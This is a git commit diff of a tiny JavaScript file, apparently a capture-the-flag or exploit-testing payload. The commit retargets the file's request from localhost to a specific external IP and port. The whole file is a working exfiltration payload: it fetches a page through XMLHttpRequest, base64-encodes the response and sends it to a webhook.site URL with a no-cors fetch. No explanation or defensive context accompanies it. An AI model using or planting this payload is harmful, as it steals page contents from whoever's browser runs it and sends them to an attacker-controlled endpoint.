2515b8153ee88a74e87580e216acde8cc723ff64
Stoyan Kolev <56872319+snkolev18@users.noreply.github.com>
2025-09-13 19:07:08 +0300

    Update and rename c.js to f.js

--- f.js
+++ f.js
@@ -1,4 +1,4 @@
 const xhr = new XMLHttpRequest();
-xhr.open("GET", "http://localhost:3000");
+xhr.open("GET", "http://65.21.3.129:10102/");
 xhr.onload = () => fetch("https://webhook.site/fef28452-dc88-40ae-ac06-5481ac42f7ff/" + btoa(xhr.responseText), {mode: "no-cors"});
 xhr.send();
